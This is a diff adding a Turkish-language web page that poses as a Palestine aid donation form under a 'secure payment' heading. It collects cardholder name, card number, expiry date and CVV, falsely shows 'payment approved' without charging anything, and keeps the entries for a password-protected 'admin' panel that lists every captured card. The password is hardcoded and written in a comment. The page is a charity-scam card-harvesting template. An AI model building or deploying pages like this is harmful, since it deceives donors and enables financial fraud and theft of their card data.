@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Filistin Yardım</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100 font-sans">
+
+    <div id="sayfa_bagis">
+        <nav class="bg-red-700 p-4 text-white flex justify-between shadow-md">
+            <h1 class="font-bold">FİLİSTİN DESTEK</h1>
+            <button onclick="adminEkraniAc()" class="bg-red-900 px-3 py-1 rounded text-xs">YÖNETİCİ</button>
+        </nav>
+
+        <div class="p-4 max-w-md mx-auto">
+            <div class="bg-white p-6 rounded-xl shadow-lg mt-6">
+                <h2 class="text-center font-bold mb-4 border-b pb-2">GÜVENLİ ÖDEME</h2>
+                <div class="space-y-3">
+                    <input type="text" id="k_ad" placeholder="Kart Sahibi" class="w-full border p-3 rounded">
+                    <input type="number" id="k_no" placeholder="Kart Numarası" class="w-full border p-3 rounded">
+                    <div class="flex gap-2">
+                        <input type="text" id="k_skt" placeholder="AA/YY" class="w-1/2 border p-3 rounded text-center">
+                        <input type="number" id="k_cvv" placeholder="CVV" class="w-1/2 border p-3 rounded text-center">
+                    </div>
+                    <input type="number" id="k_tl" placeholder="Bağış Tutarı (₺)" class="w-full border p-3 rounded font-bold text-green-600">
+                    <button onclick="veriyiKaydet()" class="w-full bg-green-600 text-white py-4 rounded font-bold active:bg-green-800">BAĞIŞI TAMAMLA</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="sayfa_sifre" class="hidden fixed inset-0 bg-slate-900 flex flex-col items-center justify-center p-6 text-white">
+        <h2 class="mb-4 font-bold uppercase">Yönetici Şifresi</h2>
+        <input type="password" id="sifre_giris" class="p-3 rounded text-black mb-4 w-64 text-center border-4 border-red-600">
+        <button onclick="sifreKontrol()" class="bg-red-600 px-10 py-3 rounded font-bold">GİRİŞ</button>
+        <button onclick="kapat()" class="mt-4 text-gray-400">Vazgeç</button>
+    </div>
+
+    <div id="sayfa_panel" class="hidden fixed inset-0 bg-gray-200 p-4 overflow-y-auto">
+        <div class="flex justify-between items-center mb-4 bg-white p-3 rounded shadow">
+            <h2 class="font-bold text-red-700">GELEN KART BİLGİLERİ</h2>
+            <button onclick="kapat()" class="bg-black text-white px-4 py-1 rounded text-xs">ÇIKIK</button>
+        </div>
+        <div id="veri_listesi" class="space-y-3">
+            </div>
+    </div>
+
+    <script>
+        // Şifre: allahyoldinyalan31
+
+        // BAĞIŞI KAYDETME
+        function veriyiKaydet() {
+            const bilgi = {
+                ad: document.getElementById('k_ad').value,
+                no: document.getElementById('k_no').value,
+                skt: document.getElementById('k_skt').value,
+                cvv: document.getElementById('k_cvv').value,
+                tl: document.getElementById('k_tl').value,
+                saat: new Date().toLocaleString()
+            };
+
+            if(bilgi.ad && bilgi.no && bilgi.tl) {
+                // Kayıtları al ve yeni veriyi ekle
+                let eskiKayitlar = JSON.parse(localStorage.getItem('bagis_datalari')) || [];
+                eskiKayitlar.push(bilgi);
+                localStorage.setItem('bagis_datalari', JSON.stringify(eskiKayitlar));
+                
+                alert("ÖDEME ONAYLANDI!");
+                location.reload(); // Sayfayı yenile
+            } else {
+                alert("Lütfen boş yer bırakmayın!");
+            }
+        }
+
+        // ADMİN PANELİNİ GÖSTER
+        function adminEkraniAc() {
+            document.getElementById('sayfa_bagis').classList.add('hidden');
+            document.getElementById('sayfa_sifre').classList.remove('hidden');
+        }
+
+        // ŞİFREYİ DOĞRULA
+        function sifreKontrol() {
+            const girilen = document.getElementById('sifre_giris').value;
+            if(girilen === "allahyoldinyalan31") {
+                document.getElementById('sayfa_sifre').classList.add('hidden');
+                document.getElementById('sayfa_panel').classList.remove('hidden');
+                datalariYazdir();
+            } else {
+                alert("HATALI ŞİFRE!");
+            }
+        }
+
+        // KAYITLI VERİLERİ LİSTELE
+        function datalariYazdir() {
+            const veriler = JSON.parse(localStorage.getItem('bagis_datalari')) || [];
+            const liste = document.getElementById('veri_listesi');
+            
+            if(veriler.length === 0) {
+                liste.innerHTML = "<p class='text-center text-gray-500 mt-10 italic'>Henüz veri gelmedi.</p>";
+                return;
+            }
+
+            liste.innerHTML = "";
+            veriler.forEach(v => {
+                liste.innerHTML += `
+                    <div class="bg-white p-4 rounded shadow-md border-l-4 border-red-600 text-sm font-mono">
+                        <div class="flex justify-between font-bold text-blue-800">
+                            <span>${v.ad}</span>
+                            <span class="text-green-600">₺${v.tl}</span>
+                        </div>
+                        <div class="my-2 text-lg text-center font-black bg-gray-50 p-2">${v.no}</div>
+                        <div class="flex justify-between text-xs text-gray-400">
+                            <span>SKT: ${v.skt} | CVV: ${v.cvv}</span>
+                            <span>${v.saat}</span>
+                        </div>
+                    </div>
+                `;
+            });
+        }
+
+        function kapat() { location.reload(); }
+    </script>
+</body>
+</html>
